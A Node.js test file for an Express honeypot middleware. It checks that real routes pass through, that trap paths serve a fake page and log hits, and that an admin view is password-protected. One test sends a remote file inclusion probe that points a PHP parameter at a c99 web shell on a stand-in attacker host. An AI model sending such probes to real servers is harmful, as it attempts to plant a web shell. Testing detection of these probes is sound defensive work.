const { test, before, after } = require("node:test");
const assert = require("node:assert");
const fs = require("fs");
const path = require("path");
const express = require("express");
const { honeypot } = require("../express");
const { listen, tempDir, basic, eventually } = require("./helpers");

let server;
let base;
const storageDir = tempDir();
const hits = [];

before(async () => {
  // A perfectly normal app that just happens to have a honeypot in it.
  const app = express();
  app.get("/", (req, res) => res.send("my real homepage"));
  app.get("/login", (req, res) => res.send("real login"));
  app.use(
    honeypot({
      storageDir,
      geoip: false,
      fetch: { enabled: false },
      beekeeper: { path: "/admin/bees", username: "bee", password: "keeper" },
      onHit: (report) => hits.push(report),
    })
  );
  app.use((req, res) => res.status(404).send("real 404"));
  ({ server, base } = await listen(app));
});

after(() => {
  server.close();
  fs.rmSync(storageDir, { recursive: true, force: true });
});

test("real routes are untouched", async () => {
  const res = await fetch(`${base}/`);
  assert.strictEqual(await res.text(), "my real homepage");
});

test("a url in the query of a real route is not a hit", async () => {
  const res = await fetch(`${base}/login?redirect=https://example.com/`);
  assert.strictEqual(await res.text(), "real login");
});

test("unknown paths fall through to the app", async () => {
  const res = await fetch(`${base}/nope?next=http://example.com`);
  assert.strictEqual(res.status, 404);
  assert.strictEqual(await res.text(), "real 404");
});

test("seo routes are off by default in middleware mode", async () => {
  const res = await fetch(`${base}/sitemap.xml`);
  assert.strictEqual(res.status, 404);
});

test("a trap path serves the fake page, logs it and calls onHit", async () => {
  const url = "/parse/parser.php?WN_BASEDIR=http://evil.example/c99.txt?";
  const res = await fetch(base + url);
  assert.strictEqual(res.status, 200);
  assert.match(await res.text(), /<h1>WEB\/\/NEWS<\/h1>/);

  const hit = await eventually(() => {
    assert.strictEqual(hits.length, 1);
    return hits[0];
  });
  assert.strictEqual(hit.url, url);
  assert.strictEqual(hit.trap, "WEB//NEWS");
  assert.strictEqual(hit.fileInclusion, "http://evil.example/c99.txt?");

  const day = new Date().toISOString().split("T")[0];
  const log = JSON.parse(
    fs.readFileSync(path.join(storageDir, "logs", `${day}.json`))
  );
  assert.strictEqual(log.datas.length, 1);
});

test("a trap path without payload is still a hit", async () => {
  const before = hits.length;
  await fetch(`${base}/parse/parser.php`);
  await eventually(() => assert.strictEqual(hits.length, before + 1));
});

test("the beekeeper can be mounted anywhere", async () => {
  const denied = await fetch(`${base}/admin/bees/darts`);
  assert.strictEqual(denied.status, 401);
  const res = await fetch(`${base}/admin/bees/darts`, {
    headers: { authorization: basic("bee", "keeper") },
  });
  const darts = await res.json();
  assert.ok(darts[0].datas.length >= 1);
});

test("beekeeper without credentials is refused at startup", () => {
  assert.throws(() => honeypot({ beekeeper: { path: "/x" } }), /password/);
});
